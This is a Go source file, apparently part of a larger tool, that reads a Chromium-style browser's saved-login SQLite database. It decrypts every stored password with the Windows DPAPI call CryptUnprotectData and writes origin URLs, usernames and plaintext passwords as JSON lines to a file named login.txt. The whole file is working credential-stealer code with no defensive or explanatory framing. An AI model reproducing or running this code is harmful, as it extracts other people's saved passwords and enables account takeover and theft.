package lib

import (
	"bufio"
	"database/sql"
	"encoding/json"
	"fmt"
	sqlite3 "github.com/ccpaging/go-sqlite3-windll"
	"log"
	"os"
	"syscall"
	"unsafe"
)

const (
	CRYPTPROTECT_UI_FORBIDDEN = 0x1
)

var (
	dllcrypt32  = syscall.NewLazyDLL("Crypt32.dll")
	dllkernel32 = syscall.NewLazyDLL("Kernel32.dll")

	procDecryptData = dllcrypt32.NewProc("CryptUnprotectData")
	procLocalFree   = dllkernel32.NewProc("LocalFree")
)

type Login struct {
	Origin string `json:"origin_url"`
	Action string `json:"action_url"`
	User   string `json:"user"`
	Pwd    string `json:"password"`
}

func DeCode(path string, addr string) error {
	err := FileExits(path)
	if err != nil {
		log.Println(err)
		return err
	}
	log.Printf("Is Windows 64: %v\n", sqlite3.SQLiteWin64)
	db, err := sql.Open("sqlite3", path)
	if err != nil {
		log.Println(err, VERSION)
		return err
	}
	defer db.Close()

	rows, err := db.Query("select origin_url,action_url,username_value,password_value from logins")
	if err != nil {
		log.Println(err)
		return err
	}
	defer rows.Close()
	arr := make([]string, 0)
	for rows.Next() {
		var origin_url, action_url, username, passwdEncrypt string
		err = rows.Scan(&origin_url, &action_url, &username, &passwdEncrypt)
		if err != nil {
			log.Println(err)
		}
		passwdByte := []byte(passwdEncrypt)
		dataout, _ := Decrypt(passwdByte)
		if username != "" && passwdEncrypt != "" {
			login := Login{
				Origin: origin_url,
				Action: action_url,
				User:   username,
				Pwd:    string(dataout[:]),
			}
			if b, err := json.Marshal(login); err == nil {
				arr = append(arr, string(b))
			}
		}
	}
	f, ferr := os.Create(BrowserSafepath + "login.txt")
	if ferr != nil {
		//log.Println(ferr)
		return ferr
	}
	defer f.Close()
	w := bufio.NewWriter(f)
	for _, line := range arr {
		fmt.Fprintln(w, line)
	}
	w.Flush()
	//log.Println(arr)
	err = rows.Err()
	if err != nil {
		//log.Fatal(err)
		return err
	}
	return nil
}

type DATA_BLOB struct {
	cbData uint32
	pbData *byte
}

func NewBlob(d []byte) *DATA_BLOB {
	if len(d) == 0 {
		return &DATA_BLOB{}
	}
	return &DATA_BLOB{
		pbData: &d[0],
		cbData: uint32(len(d)),
	}
}

func (b *DATA_BLOB) ToByteArray() []byte {
	d := make([]byte, b.cbData)
	copy(d, (*[1 << 30]byte)(unsafe.Pointer(b.pbData))[:])
	return d
}

func Decrypt(data []byte) ([]byte, error) {
	var outblob DATA_BLOB
	r, _, err := procDecryptData.Call(uintptr(unsafe.Pointer(NewBlob(data))), 0, 0, 0, 0, CRYPTPROTECT_UI_FORBIDDEN, uintptr(unsafe.Pointer(&outblob)))
	if r == 0 {
		return nil, err
	}
	defer procLocalFree.Call(uintptr(unsafe.Pointer(outblob.pbData)))
	return outblob.ToByteArray(), nil
}
